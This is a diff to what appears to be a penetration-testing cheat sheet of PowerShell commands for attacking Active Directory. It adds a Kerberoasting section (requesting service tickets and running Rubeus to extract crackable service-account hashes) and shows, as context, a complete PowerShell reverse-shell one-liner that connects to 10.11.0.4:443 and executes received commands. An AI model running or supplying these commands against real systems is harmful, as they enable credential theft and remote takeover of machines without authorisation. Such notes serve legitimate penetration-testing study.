@@ -66,6 +66,12 @@ Get-ADObject -LDAPFilter "objectClass=User" -Properties SamAccountName | select 
 Set-ExecutionPolicy Unrestricted
 klist   # list the cached Kerberos tickets
 
+----------Service Account Attack------------
+.\enumSPN.ps1
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken-ArgumentList '[serviceprincipalname]'
+Rubeus.exe kerberoast /tgtdeleg /user:[samaccountname]
+
 ---------------Reverse Shell----------------
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
